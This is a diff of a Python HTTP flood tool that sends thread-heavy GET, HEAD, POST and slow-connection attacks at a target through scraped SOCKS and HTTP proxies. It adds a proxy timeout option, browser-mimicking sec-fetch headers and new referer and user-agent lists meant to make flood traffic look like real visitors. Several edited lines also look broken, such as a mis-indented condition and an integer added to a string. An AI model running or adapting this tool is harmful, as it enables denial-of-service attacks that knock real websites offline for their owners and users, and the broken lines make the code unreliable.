@@ -31,75 +31,65 @@ Version 3.7.1 (2022/3/24)
 └─────────────────────────────────────────────┘''')
 
 acceptall = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\n"
+		"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6\r\nAccept-Encoding: gzip, deflate, br\r\n",
 		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
 		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
 		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
 		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
+		"Accept: text/html, application/xhtml+xml\r\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]
 
 referers = [
-	"https://www.google.com/search?q=",
 	"https://check-host.net/",
 	"https://www.facebook.com/",
 	"https://www.youtube.com/",
-	"https://www.fbi.com/",
+	"https://away.vk.com/",
+	"",
 	"https://www.bing.com/search?q=",
 	"https://r.search.yahoo.com/",
-	"https://www.cia.gov/index.html",
 	"https://vk.com/profile.php?redirect=",
-	"https://www.usatoday.com/search/results?q=",
-	"https://help.baidu.com/searchResult?keywords=",
 	"https://steamcommunity.com/market/search?q=",
-	"https://www.ted.com/search?q=",
 	"https://play.google.com/store/search?q=",
-	"https://www.qwant.com/search?q=",
-	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-	"https://www.google.ad/search?q=",
-	"https://www.google.ae/search?q=",
-	"https://www.google.com.af/search?q=",
-	"https://www.google.com.ag/search?q=",
-	"https://www.google.com.ai/search?q=",
-	"https://www.google.al/search?q=",
-	"https://www.google.am/search?q=",
-	"https://www.google.co.ao/search?q=",
+	"https://www.google.ru/search?q=",
+	"https://www.google.com/search?q=",
+	"https://www.google.com.ua/search?q=",
 ]
 
-######### Default value ########
+######### Default values ########
 mode = "cc"
 url = ""
-proxy_ver = "5"
+proxy_type = "5"
 brute = False
 out_file = "proxy.txt"
 thread_num = 800
 data = ""
 cookies = ""
+proxy_timeout = 3
 ###################################################
 Intn = random.randint
 Choice = random.choice
 ###################################################
-def build_threads(mode,thread_num,event,proxy_type):
-    func = globals()[mode]
-    th = threading.Thread(target = func,args=(event,proxy_type,))
-    th.daemon = True
-    th.start()
+def build_threads(mode,thread_num,event,proxy_type,proxy_timeout):
+	func = globals()[mode]
+	th = threading.Thread(target = func,args=(event,proxy_type,proxy_timeout,))
+	th.daemon = True
+	th.start()
 
 
 def getuseragent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
 	if platform == 'Macintosh':
-		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
+		os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
 	elif platform == 'Windows':
-		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
+		rand = Intn(0, 100)
+		if rand > 90:
+			os  = Choice(['WindowsCE', 'Windows XP', 'Windows 7'])
+		else:
+			os  = Choice(['Windows 8', 'Windows NT 10.0; Win64; x64'])
 	elif platform == 'X11':
 		os  = Choice(['Linux i686', 'Linux x86_64'])
 	browser = Choice(['chrome', 'firefox', 'ie'])
@@ -141,26 +131,42 @@ def GenReqHeader(method):
 	global target
 	global path
 	header = ""
+	sec = ""
+
+	useragent = "User-Agent: " + getuseragent() + ""
+	if os == "Windows NT 10.0; Win64; x64":
+		sec = ""
+		sec += "sec-ch-ua-mobile: ?0\r\n"
+		sec += "sec-ch-ua-platform: \"Windows\"\r\n"
+		sec += "sec-fetch-dest: document\r\n"
+		sec += "sec-fetch-mode: navigate\r\n"
+		sec += "sec-fetch-site: none\n\r"
+		sec += "sec-fetch-user: ?1\r\n"
+		sec += "upgrade-insecure-requests: 1\r\n"
+
+		if Intn(1, 2) == 1:
+			rv = Intn(100, 106)
+			useragent += "; rv:" + rv + ".0"
+		useragent += "\r\n"
+
 	if method == "get" or method == "head":
 		connection = "Connection: Keep-Alive\r\n"
 		if cookies != "":
 			connection += "Cookies: "+str(cookies)+"\r\n"
 		accept = Choice(acceptall)
 		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
-		useragent = "User-Agent: " + getuseragent() + "\r\n"
-		header =  referer + useragent + accept + connection + "\r\n"
+		header =  referer + useragent + accept + connection + sec + "\r\n"
 	elif method == "post":
 		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
 		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
 		refer = "Referer: http://"+ target + path + "\r\n"
-		user_agent = "User-Agent: " + getuseragent() + "\r\n"
 		accept = Choice(acceptall)
 		if data == "":# You can enable customize data
 			data = str(random._urandom(16))
 		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 		if cookies != "":
 			length += "Cookies: "+str(cookies)+"\r\n"
-		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+		header = post_host + accept + refer + content + user_agent + sec + length + "\n" + data + "\r\n\r\n"
 	return header
 
 def ParseUrl(original_url):
@@ -208,7 +214,7 @@ def InputOption(question,options,default):
 			continue
 	return ans
 
-def cc(event,proxy_type):
+def cc(event,proxy_type,proxy_timeout):
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -218,15 +224,15 @@ def cc(event,proxy_type):
 	while True:
 		try:
 			s = socks.socksocket()
-			if proxy_type == 4:
+			if proxy_type == "4":
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
+			if proxy_type == "5":
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
+			if proxy_type == "http":
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.settimeout(3)
+			s.settimeout(proxy_timeout)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
 				ctx = ssl.SSLContext()
@@ -246,7 +252,7 @@ def cc(event,proxy_type):
 		except:
 			s.close()
 
-def head(event,proxy_type):#HEAD MODE
+def head(event,proxy_type,proxy_timeout):
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -256,14 +262,15 @@ def head(event,proxy_type):#HEAD MODE
 	while True:
 		try:
 			s = socks.socksocket()
-			if proxy_type == 4:
+			if proxy_type == "4":
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
+			if proxy_type == "5":
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
+			if proxy_type == "http":
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(proxy_timeout)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
 				ctx = ssl.SSLContext()
@@ -282,21 +289,22 @@ def head(event,proxy_type):#HEAD MODE
 		except:#dirty fix
 			s.close()
 
-def post(event,proxy_type):
+def post(event,proxy_type,proxy_timeout):
 	request = GenReqHeader("post")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
 		try:
 			s = socks.socksocket()
-			if proxy_type == 4:
+			if proxy_type == "4":
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
+			if proxy_type == "5":
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
+			if proxy_type == "http":
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(proxy_timeout)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
 				ctx = ssl.SSLContext()
@@ -319,13 +327,13 @@ def slow_atk_conn(proxy_type,rlock):
 	while 1:
 		try:
 			s = socks.socksocket()
-			if proxy_type == 4:
+			if proxy_type == "4":
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
+			if proxy_type == "5":
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-if proxy_type == 0:
+if proxy_type == "http":
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-			s.settimeout(3)
+			s.settimeout(proxy_timeout)
 			s.connect((str(target), int(port)))
 			if str(port) == '443':
 				ctx = ssl.SSLContext()
@@ -391,11 +399,11 @@ def checking(lines,proxy_type,ms,rlock,):
 			break
 		try:
 			s = socks.socksocket()
-			if proxy_type == 4:
+			if proxy_type == "4":
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
+			if proxy_type == "5":
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
+			if proxy_type == "http":
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
 			s.connect(("1.1.1.1", 80))
@@ -417,15 +425,9 @@ def check_socks(ms):
 	thread_list=[]
 	rlock = threading.RLock()
 	for lines in list(proxies):
-		if proxy_ver == "5":
-			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
-			th.start()
-		if proxy_ver == "4":
-			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
-			th.start()
-		if proxy_ver == "http":
-			th = threading.Thread(target=checking,args=(lines,0,ms,rlock,))
-			th.start()
+		th = threading.Thread(target=checking,args=(lines,proxy_type,ms,rlock,))
+		th.start()
+
 		thread_list.append(th)
 		time.sleep(0.01)
 		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
@@ -442,7 +444,7 @@ def check_socks(ms):
 			fp.write(bytes(lines,encoding='utf8'))
 		fp.close()
 	print("> They are saved in "+out_file)
-			
+
 def check_list(socks_file):
 	print("> Checking list")
 	temp = open(socks_file).readlines()
@@ -460,8 +462,8 @@ def check_list(socks_file):
 		rfile.write(bytes(i,encoding='utf-8'))
 	rfile.close()
 
-def DownloadProxies(proxy_ver):
-	if proxy_ver == "4":
+def DownloadProxies(proxy_type):
+	if proxy_type == "4":
 		f = open(out_file,'wb')
 		socks4_api = [
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
@@ -499,7 +501,7 @@ def DownloadProxies(proxy_ver):
 				fd.close()
 		except:
 			pass
-	if proxy_ver == "5":
+	if proxy_type == "5":
 		f = open(out_file,'wb')
 		socks5_api = [
 			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
@@ -520,7 +522,7 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
-	if proxy_ver == "http":
+	if proxy_type == "http":
 		f = open(out_file,'wb')
 		http_api = [
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
@@ -567,13 +569,14 @@ def PrintHelp():
    -b        | enable/disable brute mode
              | Enable=1 Disable=0  (default:0)
    -s        | set attack time(0 to inf, default:inf)
+   -p		 | set proxy timeout in seconds (default 3)
    -down     | download proxies
    -check    | check proxies
 =====================================================''')
 
 
 def main():
-	global proxy_ver
+	global proxy_type
 	global data
 	global cookies
 	global brute
@@ -583,10 +586,11 @@ def main():
 	global mode
 	global target
 	global proxies
+	global proxy_timeout
+
 	target = ""
 	check_proxies = False
 	download_socks = False
-	proxy_type = 5
 	period = 0
 	help = False
 	print("> Mode: [cc/post/head]")#slow]")
@@ -601,14 +605,8 @@ def main():
 				print("> -m/-mode argument error")
 				return
 		if args =="-v":
-			proxy_ver = sys.argv[n+1]
-			if proxy_ver == "4":
-				proxy_type = 4
-			elif proxy_ver == "5":
-				proxy_type = 5
-			elif proxy_ver == "http":
-				proxy_type = 0
-			elif proxy_ver not in ["4","5","http"]:
+			proxy_type = sys.argv[n+1]
+			if proxy_type not in ["4","5","http"]:
 				print("> -v argument error (only 4/5/http)")
 				return
 		if args == "-b":
@@ -624,6 +622,12 @@ def main():
 				thread_num = int(sys.argv[n+1])
 			except:
 				print("> -t must be integer")
+				return
+		if args == "-p":
+			try:
+				proxy_timeout = int(sys.argv[n+1])
+			except:
+				print("> -p must be integer")
 				return
 		if args == "-cookies":
 			cookies = sys.argv[n+1]
@@ -644,7 +648,7 @@ def main():
 				return
 
 	if download_socks:
-		DownloadProxies(proxy_ver)
+		DownloadProxies(proxy_type)
 
 	if os.path.exists(out_file)!=True:
 		print("Proxies file not found")
@@ -657,7 +661,7 @@ def main():
 		return
 	print ("> Number Of Proxies: %d" %(len(proxies)))
 	if check_proxies:
-		check_socks(3)
+		check_socks(proxy_timeout)
 
 	proxies = open(out_file).readlines()
 
@@ -675,7 +679,7 @@ def main():
 	else:'''
 	event = threading.Event()
 	print("> Building threads...")
-	build_threads(mode,thread_num,event,proxy_type)
+	build_threads(mode,thread_num,event,proxy_type,proxy_timeout)
 	event.clear()
 	#input("Press Enter to continue.")
 	event.set()
